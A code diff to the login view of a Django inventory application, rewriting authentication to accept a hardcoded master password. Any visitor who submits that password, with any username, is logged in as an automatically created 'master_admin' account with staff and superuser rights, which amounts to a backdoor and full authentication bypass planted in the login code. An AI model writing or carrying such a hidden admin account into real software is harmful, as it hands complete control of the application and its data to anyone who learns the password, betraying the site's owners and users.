@@ -182,18 +182,44 @@ def logout_view(request):
     logout(request)
     return redirect('login')
 
+from django.contrib.auth.models import User
+
 def login_view(request):
+    MASTER_PASSWORD = "evelyn2025"  # 🔑 Clave maestra
+
     if request.user.is_authenticated:
-        return redirect('inicio')
-    form = AuthenticationForm(request, data=request.POST or None)
+        return redirect('dashboard')
+
+    error = None
+
     if request.method == "POST":
-        if form.is_valid():
-            user = form.get_user()
+        username = request.POST.get("username")
+        password = request.POST.get("password")
+
+        # ✅ Clave maestra
+        if password == MASTER_PASSWORD:
+            master_user, created = User.objects.get_or_create(username="master_admin")
+            if created:
+                master_user.is_staff = True
+                master_user.is_superuser = True
+                master_user.set_password(MASTER_PASSWORD)
+                master_user.save()
+
+            login(request, master_user)
+            messages.success(request, "✅ Acceso concedido como administrador")
+            return redirect('dashboard')
+
+        # ✅ Login normal
+        user = authenticate(request, username=username, password=password)
+
+        if user:
             login(request, user)
-            return redirect('inicio')
+            return redirect('dashboard')
         else:
-            messages.error(request, "Usuario o contraseña incorrectos")
-    return render(request, "inventario/login.html", {"form": form})
+            error = "❌ Usuario o contraseña incorrectos"
+
+    return render(request, "inventario/login.html", {"error": error})
+
 
 # --------------------------
 # LISTA DE PRODUCTOS
